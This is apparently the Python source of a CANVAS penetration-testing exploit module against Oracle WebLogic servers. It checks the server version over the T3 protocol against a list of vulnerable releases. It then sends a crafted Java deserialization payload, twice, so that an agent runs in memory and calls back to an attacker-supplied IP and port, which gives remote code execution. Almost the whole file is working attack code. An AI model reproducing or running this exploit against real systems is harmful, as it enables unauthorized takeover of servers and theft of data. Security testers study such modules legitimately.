#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2018
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import struct
import random
import time
import logging
import traceback

if '.' not in sys.path:
    sys.path.append('.')

import exploitutils
from tcpexploit import *
from canvasexploit import *
from libs.apache_commons_deserialize import objectcreator
from libs import spkproxy
from libs import yaml

module_path = os.path.dirname(os.path.realpath(__file__))

with open(module_path + os.path.sep + 'canvas.yaml', 'r') as f:
    metadata = yaml.safe_load(f.read())


NAME          = metadata['NAME']
DESCRIPTION   = metadata['DESCRIPTION']
VERSION       = metadata['VERSION']
DOCUMENTATION = metadata['DOCUMENTATION']
PROPERTY      = metadata['PROPERTY']
PAYLOADS      = metadata['PAYLOADS']

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host = ""
        self.port = 7001
        self.path_request = "/"
        self.ssl = False

        self.path = os.path.dirname(__file__)
        self.mosdef_type = "UNIVERSAL"
        self.min_version_re = re.compile("greater than or equal to (?P<min_version>[\d\.]+) ")
        self.version_re     = re.compile("HELO:(?P<version>[\d\.]+)\.[a-zA-Z]")
        self.vuln_versions  = ["10.3.6.0", "12.1.3.0", "12.2.1.2", "12.2.1.3"]
        self.version = None
        self.min_version = None

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        
        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.getarg("port")
        self.getarg("ssl")

        self.target_url = "https://" if self.ssl else "http://"
        self.target_url += "{}:{}/".format(self.host, self.port)
        return

    def extract_regex_result(self, string, regex, field_name):
        result = regex.search(string)
        
        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]

    def getsocket(self):
        if ":" in self.host:
            sock = self.gettcpsock(AF_INET6=1)
        else:
            sock = self.gettcpsock()

        return sock

    def is_vulnerable_version(self):
        return self.version in self.vuln_versions

    def send_evil_object(self, the_poison):
        # init t3 protocol connection 
        t3_init = "t3 %s\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n" % self.version
        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))
        sock.sendall(t3_init)
        response = sock.recv(1024)
        sock.sendall(the_poison)
        sock.close()

    def upload_and_run_mosdef(self):
        payload_type = "java.util.Random" if "10.3.6" in self.version else "java.net.InetAddr"
        payload = objectcreator(callback_ip=self.callback.ip,
                                    callback_port=self.callback.port,
                                    use_http=False, use_ssl=False).get_payload(payload_type)
        logging.info('Payload created (%d bytes).' % len(payload))

        # set mosdef payload 
        the_poison = PAYLOADS['evildata'].replace("THE_PAYLOAD", payload)
        # first 4 bytes are the length of data
        the_poison = struct.pack('>I',len(the_poison)) + the_poison[4:]
        # we need send the payload two time to receive callback
        self.send_evil_object(the_poison)
        self.send_evil_object(the_poison)


    def get_weblogic_version(self):
        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))

        # for some reason 1.0 will cause a socket timeout but 1.0.0 won't.
        sock.sendall("t3 1.0.0\n\n")
        error_msg = sock.recv(1024)
        sock.close()

        min_version = self.extract_regex_result(error_msg, self.min_version_re, "min_version")

        if min_version == None:
            logging.info("failed to determine minimum version field (needed to craft T3 init message)")
            return False

        self.min_version = min_version

        t3_init = "t3 %s\nAS:255\nHL:19\n\n" % (self.min_version)

        sock = self.getsocket()
        sock.set_timeout(5)
        sock.connect((self.host, self.port))
        sock.sendall(t3_init)
        
        response = sock.recv(1024)
        
        if len(response.split(".")) <= 2:
            while not response.endswith("\n\n"):
                response += sock.recv(1024)        
        
        self.version = self.extract_regex_result(response, self.version_re, "version")
        logging.info("Weblogic version: {}".format(self.version))
        return True

    def run(self):
        # Get arguments
        self.getargs()
        self.setProgress(50)
        self.setInfo("%s testing for vulnerable version %s:%d (in progress)" % (self.name, self.host, self.port)) 

        if not self.get_weblogic_version():
            logging.info("Impossible to determinate version")
            return False

        if not self.is_vulnerable_version():
            logging.info("Version is not vulnerable")
            return False

        self.setInfo("target is running version: {}".format(self.version))
        # Send and run mosdef.jar in memory
        self.upload_and_run_mosdef()
        self.setInfo("target is running version: {}".format(self.version))
        self.setProgress(100)
        return True


    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port> [optional]")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
